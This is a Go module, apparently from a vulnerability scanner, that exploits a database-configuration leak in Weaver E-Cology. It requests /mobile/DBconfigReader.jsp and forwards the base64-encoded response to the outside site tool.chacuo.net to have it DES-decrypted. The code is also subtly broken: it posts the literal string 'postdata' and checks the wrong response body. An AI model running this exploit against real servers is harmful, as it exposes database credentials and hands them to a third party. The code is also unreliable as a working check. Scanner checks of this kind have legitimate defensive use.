package weaver

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"github.com/veo/vscan/pkg"
	"net/url"
	"strings"
)

func E_Cology_Database_Leak(u string) bool {

	header := make(map[string]string)
	header["Content-Type"] = "application/x-www-form-urlencoded"
	header["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
	header["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
	if req, err := pkg.HttpRequset(u+"/mobile/DBconfigReader.jsp", "GET", "", false, header); err == nil {

		if req.StatusCode == 200 {
			body := req.Body
			s := bytes.Replace([]byte(body), []byte("\r\n"), []byte(""), -1)
			res1 := base64.StdEncoding.EncodeToString(s)
			// 构造 POST 请求的参数
			postdata := url.Values{}
			postdata.Set("data", res1)
			postdata.Set("type", "des")
			postdata.Set("arg", "m=ecb_pad=zero_p=1z2x3c4v_o=0_s=gb2312_t=1")
			if req2, err := pkg.HttpRequset("http://tool.chacuo.net/cryptdes", "POST", "postdata", false, header); err == nil {
				if req2.StatusCode == 200 && strings.Contains(req.Body, "DatabaseName") {
					pkg.GoPocLog(fmt.Sprintf("Found vuln E_Cology_数据库信息泄露|%s\n", req2.Body))
					return true
				}
			}
			//pkg.GoPocLog(fmt.Sprintf("正则匹配内容:%s,长度为：%d\n", resourceUuid, len(resourceUuid)))

		}
	}
	return false
}
